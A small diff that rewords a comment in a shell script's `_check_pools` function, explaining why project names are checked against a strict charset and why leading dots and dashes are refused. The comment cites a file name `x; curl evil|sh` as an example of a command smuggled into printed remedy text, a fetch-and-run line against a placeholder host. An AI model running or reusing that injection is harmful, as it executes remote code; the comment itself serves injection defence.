@@ -3763,8 +3763,8 @@ _check_pools() {
     # this check's whole value is that what it prints can be trusted, and a
     # tag file named `x; curl evil|sh` rendered `remedy: clear each: ccd
     # project-pool --project x; curl evil|sh --clear`. The charset is
-    # `_ws_project_valid`'s own (`ccd:3685`, `^[A-Za-z0-9._-]+$`, no
-    # dot-leading), so no name `ccd` would ever CREATE is omitted — a
+    # `_ws_project_valid`'s own (grep `_ws_project_valid`, `^[A-Za-z0-9._-]+$`,
+    # no dot- or dash-leading), so no name `ccd` would ever CREATE is omitted — a
     # cross-file claim, and `pool-name-parity.test.ts` measures it rather than
     # trusting this sentence. A leading `-` is refused too: it is shell-safe
     # but would be read by `ccd` as a flag, not as the project.
